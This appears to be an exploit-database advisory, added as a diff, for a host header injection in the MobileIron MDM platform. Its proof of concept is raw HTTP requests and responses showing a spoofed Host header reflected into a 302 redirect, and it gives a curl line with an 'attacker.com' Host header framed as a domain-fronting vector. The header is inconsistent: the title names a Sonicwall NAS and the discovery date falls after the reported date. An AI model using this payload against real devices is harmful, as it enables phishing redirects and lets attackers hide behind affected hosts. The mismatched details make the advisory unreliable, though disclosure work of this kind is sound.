@@ -1,0 +1,134 @@
+# Exploit Title: Sonicwall NAS Host Header Redirect Vulnerability.
+# Google Dork: intitle:"MobileIron Admin Portal" intitle:"MobileIron User Portal"
+# Discovered Date: 23/08/2021
+# Reported Date: 07/09/2020
+# Exploit Author: Ramikan 
+# Website: http://fact-in-hack.blogspot.com
+# Vendor Homepage:
+# Affected Devices: MobileIron MDM Platform
+# Tested On: 11.0 & 11.1
+# Affected Version: 11.1 and below
+# CVE : 
+# CVSS v3.1: 4.7 (AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N)
+# Category:Hardware, Web Apps
+# Reference : https://github.com/Ramikan/Vulnerabilities/
+
+*************************************************************************************************************************************
+
+Vulnerability 1: Host Header Injection
+
+*************************************************************************************************************************************
+Description:
+A Host Header Injection vulnerability may allow an attacker to spoof a particular Host header, allowing the attacker to render arbitrary links that point to a malicious website with poisoned Host header webpages.
+An issue was discovered in MobileIron version 11.0 & 11.1 (may be affected on other versions too). The values of the 'Host' headers are implicitly set as trusted while this should be forbidden, leading to potential host header injection attack and also the affected hosts can be used for domain fronting. This means affected hosts can be used by attackers to hide behind during various other attack
+
+Impact:
+Host Header changed to different domain (fakedomain.com).
+
+
+*************************************************************************************************************************************
+Normal Request
+*************************************************************************************************************************************
+GET / HTTP/1.0
+Host: 192.168.1.5
+Connection: close
+sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="88"
+sec-ch-ua-mobile: ?0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+
+*************************************************************************************************************************************
+Normal Response
+*************************************************************************************************************************************
+HTTP/1.1 302 Found
+Date: Fri, 27 Aug 2021 11:12:21 GMT
+Server: server
+X-XSS-Protection: 1; mode=block
+X-Frame-Options: SameOrigin
+X-Content-Type-Options: nosniff
+Location: https://mdm-mi.ok.gov/mifs/user/index.html
+Content-Length: 290
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>302 Found</title>
+</head><body>
+<h1>Found</h1>
+<p>The document has moved <a href="https://192.168.1.5/mifs/user/index.html">here</a>.</p>
+<hr>
+<address>server Server at 192.168.1.5 Port 443</address>
+</body></html>
+
+*************************************************************************************************************************************
+POC 
+*************************************************************************************************************************************
+
+
+*************************************************************************************************************************************
+Request:
+*************************************************************************************************************************************
+GET / HTTP/1.1
+Host: google.com
+Connection: close
+sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="88"
+sec-ch-ua-mobile: ?0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+
+
+*************************************************************************************************************************************
+Response:
+*************************************************************************************************************************************
+HTTP/1.1 302 Found
+Date: Fri, 27 Aug 2021 10:54:19 GMT
+Server: server
+X-XSS-Protection: 1; mode=block
+X-Frame-Options: SameOrigin
+X-Content-Type-Options: nosniff
+Location: https://google.com/mifs/user/index.html
+Content-Length: 284
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>302 Found</title>
+</head><body>
+<h1>Found</h1>
+<p>The document has moved <a href="https://google.com/mifs/user/index.html">here</a>.</p>
+<hr>
+<address>server Server at google.com Port 443</address>
+</body></html>
+
+
+The redirection is happening to https://google.com/mifs/user/index.html.
+
+*************************************************************************************************************************************
+Attack Vector:
+*************************************************************************************************************************************
+Can be used for domain fronting.
+
+curl -k --header "Host: attacker.com" "domainname of the MobileIron device"
+
+
+*************************************************************************************************************************************
+Vendor Response:
+*************************************************************************************************************************************
+Awaiting..
+*************************************************************************************************************************************
